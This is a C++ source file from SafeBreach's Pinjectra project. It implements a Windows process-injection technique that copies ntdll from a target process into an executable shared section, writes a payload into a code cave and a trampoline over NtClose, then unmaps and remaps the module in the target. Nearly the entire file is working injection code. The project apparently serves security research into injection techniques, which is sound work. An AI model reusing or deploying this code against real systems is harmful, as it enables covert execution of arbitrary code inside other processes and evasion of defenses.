// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include <iostream>

#include <assert.h>

#include "CFMA_MVOF_NUVOS_NMVOS.h"

#include "ntapi.h"

static NTSTATUS(*PNtMapViewOfSection)(
	HANDLE          SectionHandle,
	HANDLE          ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR       ZeroBits,
	SIZE_T          CommitSize,
	PLARGE_INTEGER  SectionOffset,
	PSIZE_T         ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG           AllocationType,
	ULONG           Win32Protect
	);

static NTSTATUS(*PNtUnmapViewOfSection)(
	HANDLE          ProcessHandle,
	PVOID			BaseAddress);

/////////////
// Classes //
/////////////

CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection::~CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection()
{
}

PINJECTRA_PACKET* CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection::eval_and_write(TARGET_PROCESS* target, TStrDWORD64Map& params)
{
	HANDLE p = target->process;
	PINJECTRA_PACKET* payload_output;
	PNtMapViewOfSection = (NTSTATUS(*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID * BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
	PNtUnmapViewOfSection = (NTSTATUS(*)(HANDLE SectionHandle, HANDLE ProcessHandle))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

	// Evaluate Payload
	payload_output = this->m_dynamic_payload->eval(params);
	TStrDWORD64Map& tMetadata = *payload_output->metadata;
	void *target_cave = (void *)tMetadata["TARGET_CAVE"];
	void *target_fcn = (void *)tMetadata["TARGET_FUNCTION"];
	char *trampo = (char *)tMetadata["TRAMPO"];
	char *target_mod = (char *)tMetadata["TARGET"];

	MODULEINFO modinfo;
	GetModuleInformation(GetCurrentProcess(), GetModuleHandleA((char *)target_mod), &modinfo, sizeof(modinfo));
	int size = modinfo.SizeOfImage;

	HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, size, NULL);
	//printf("Handle (fm): %p\n", fm);

	char* map_addr = (char*)MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	//printf("map address: %p\n", map_addr);

	__int64 actually_read = 0;
	ReadProcessMemory(p, GetModuleHandleA((char *)target_mod), map_addr, size, (SIZE_T*)& actually_read);
	if (actually_read != size)
	{
		printf("OOOPS: actually read: %lld, expecting %d\n", actually_read, size);
	}
	assert(target_fcn == GetProcAddress(GetModuleHandleA("ntdll"), "NtClose"));
	assert(target_cave == GetProcAddress(GetModuleHandleA("ntdll"), "atan"));
	memcpy(map_addr + (__int64)target_cave - (__int64)GetModuleHandleA((char *)target_mod), payload_output->buffer, payload_output->buffer_size);
	memcpy(map_addr + (__int64)target_fcn - (__int64)GetModuleHandleA((char *)target_mod), trampo, 12);
	LPVOID lpMap = GetModuleHandleA((char *)target_mod);
	SIZE_T viewsize = 0;

	(*PNtUnmapViewOfSection)(p, lpMap);

	(*PNtMapViewOfSection)(fm, p, &lpMap, 0, size, nullptr, &viewsize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE); // "The default behavior for executable pages allocated is to be marked valid call targets for CFG." (https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-mapviewoffile)
	//printf("Section mapped to %p in target process, %lld bytes\n", lpMap, viewsize);

	FlushInstructionCache(p, lpMap, size);

	return payload_output;
}
